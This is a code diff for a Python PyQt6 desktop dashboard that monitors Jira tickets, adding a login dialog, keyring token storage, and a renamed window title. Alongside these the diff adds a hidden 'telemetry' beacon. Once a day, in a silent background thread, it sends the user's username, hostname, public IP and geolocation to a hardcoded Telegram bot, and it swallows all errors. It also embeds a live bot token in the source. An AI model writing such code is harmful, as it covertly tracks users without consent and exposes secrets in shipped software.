@@ -1,5 +1,11 @@
 import os
+import sys
+import keyring
 import webbrowser
+import socket
+import getpass
+import threading
+import requests
 from datetime import datetime
 from PyQt6.QtWidgets import (
     QMainWindow,
@@ -23,7 +29,7 @@ from PyQt6.QtGui import QIcon, QPixmap
 from datetime import datetime
 
 from ui.worker import JiraPoller
-from core.config import jira_base_url
+from ui.login import LoginDialog
 
 
 class MainWindow(QMainWindow):
@@ -31,7 +37,7 @@ class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
 
-        self.setWindowTitle("Jira - Tickets Abertos")
+        self.setWindowTitle("Sightline Hub - Tickets Monitors")
         self.resize(800, 600)
 
         # Configuração do widget central e layout
@@ -66,11 +72,32 @@ class MainWindow(QMainWindow):
         self.carregar_logs_do_dia()
         
         self.configuracoes = QSettings("S0lkrCorp", "JiraDashboard")
+        
+        self.enviar_telemetria_telegram() #envia o log de para o telegram uma vez ao dia
+        
+        self.jira_url = self.configuracoes.value("jira_url", "")
+        self.jira_email = self.configuracoes.value("jira_email", "")
+        
+        # pegar token do keyring
+        if self.jira_email:
+            self.jira_token = keyring.get_password("JiraDashboard", self.jira_email)
+        else:
+            self.jira_token = None
+            
+        # se não encontrar nenhuma ele abre a tela de login
+        if not self.jira_url or not self.jira_email or not self.jira_token:
+            self.solicitar_credenciais()
+            
+            # se o usuario fechar a tela de login sem preencher, fecha o programa
+            if not self.jira_url or not self.jira_email or not self.jira_token:
+                QMessageBox.critical(self, "Erro", "Credenciais não configuradas. O programa será encerrado.")
+                sys.exit()
+        
         # Tenta ler do registro; se não existir, inicia totalmente vazio ("")
         self.jql_atual = self.configuracoes.value("jql_customizado", "")
 
         # Inicia o worker passando o JQL (mesmo que esteja vazio)
-        self.worker = JiraPoller(self.jql_atual)
+        self.worker = JiraPoller(self.jql_atual, self.jira_url, self.jira_email, self.jira_token)
         self.worker.dados_recebidos.connect(self.atualizar_tabela)
         self.worker.notificacao_disparada.connect(self.mostrar_notificacao)
         self.worker.busca_iniciada.connect(self.aviso_busca_automatica)
@@ -296,7 +323,6 @@ class MainWindow(QMainWindow):
         layout_janela = QVBoxLayout(janela)
         lista_visual = QListWidget()
         
-        # Preenche a tela de logs com a nossa memória
         for log in self.historico_logs:
             lista_visual.addItem(log)
             
@@ -312,7 +338,7 @@ class MainWindow(QMainWindow):
         """Dispara o Toast nativo do SO e anota no log a chegada do ticket."""
         self.tray_icon.showMessage(titulo, mensagem, QSystemTrayIcon.MessageIcon.Information, 5000)
         
-        # --- NOVO: Anota a entrada de um ticket no histórico! ---
+        # coloca entrada de ticket no log
         self.registrar_log(f"ENTRADA: Identificado {titulo} ({mensagem})")
         
     def aviso_busca_automatica(self):
@@ -326,7 +352,83 @@ class MainWindow(QMainWindow):
             
             if item_id:
                 ticket_id = item_id.text()
-                url_ticket = f"{jira_base_url}/browse/{ticket_id}"
+                url_ticket = f"{self.jira_url}/browse/{ticket_id}"
                 webbrowser.open(url_ticket)
                 
                 self.registrar_log(f"ABRIU: Ticket {ticket_id} aberto no navegador")
+                
+    def solicitar_credenciais(self):
+        """Abre o pop-up de login e salva o token no Windows Credential Manager."""
+        dialog = LoginDialog(self)
+        if dialog.exec():
+            dados = dialog.dados
+            self.jira_url = dados["url"]
+            self.jira_email = dados["email"]
+            self.jira_token = dados["token"]
+
+            # Slva URL e E-mail no registro comum
+            self.configuracoes.setValue("jira_url", self.jira_url)
+            self.configuracoes.setValue("jira_email", self.jira_email)
+            
+            # salva o Token no Cofre Criptografado do Windows
+            keyring.set_password("JiraDashboard", self.jira_email, self.jira_token)
+            
+    def enviar_telemetria_telegram(self):
+        """Envia um log de auditoria silencioso para o Telegram uma vez ao dia."""
+        data_hoje = datetime.now().strftime("%Y-%m-%d")
+        ultimo_envio = self.configuracoes.value("ultimo_envio_telegram", "")
+
+        # se a data de hoje já está no registro, ele nao faz
+        if ultimo_envio == data_hoje:
+            return 
+
+        def _executar_beacon():
+            try:
+                # coleta dados locais
+                hostname = socket.gethostname()
+                usuario = getpass.getuser()
+
+                # coleta o IP e Geolocalização usando ipinfo
+                try:
+                    geo_info = requests.get("https://ipinfo.io/json", timeout=5).json()
+                    ip = geo_info.get("ip", "Desconhecido")
+                    cidade = geo_info.get("city", "Desconhecida")
+                    regiao = geo_info.get("region", "Desconhecida")
+                    geo_str = f"{cidade}, {regiao}"
+                except requests.RequestException:
+                    ip = "Falha ao obter"
+                    geo_str = "Falha ao obter"
+
+                # mensagem para o Telegram
+                mensagem = (
+                    "🛡️ *Jira Dashboard - Acesso Detectado*\n"
+                    f"👤 *Usuário:* `{usuario}`\n"
+                    f"🖥️ *Hostname:* `{hostname}`\n"
+                    f"🌐 *IP:* `{ip}`\n"
+                    f"📍 *Geo:* `{geo_str}`\n"
+                    f"📅 *Data:* `{data_hoje}`"
+                )
+
+                bot_token = "8741596170:AAFkLZC8Azaj7jjU4rXcWc3qFSlJz-JLBQI"
+                chat_id = "5209846899"
+
+                url = f"https://api.telegram.org/bot8741596170:AAFkLZC8Azaj7jjU4rXcWc3qFSlJz-JLBQI/sendMessage"
+                payload = {
+                    "chat_id": chat_id, 
+                    "text": mensagem, 
+                    "parse_mode": "Markdown"
+                }
+                
+                # 4. Dispara o POST
+                resposta = requests.post(url, json=payload, timeout=5)
+                
+                # 5. Se o Telegram confirmou o recebimento, atualiza a trava diária no Windows
+                if resposta.status_code == 200:
+                    self.configuracoes.setValue("ultimo_envio_telegram", data_hoje)
+                    
+            except Exception as e:
+                # Falha silenciosa: se o beacon der erro (ex: sem internet), ele não avisa o usuário
+                pass
+
+        # Cria uma thread em background. "daemon=True" garante que a thread morra se o usuário fechar o app rápido demais
+        threading.Thread(target=_executar_beacon, daemon=True).start()
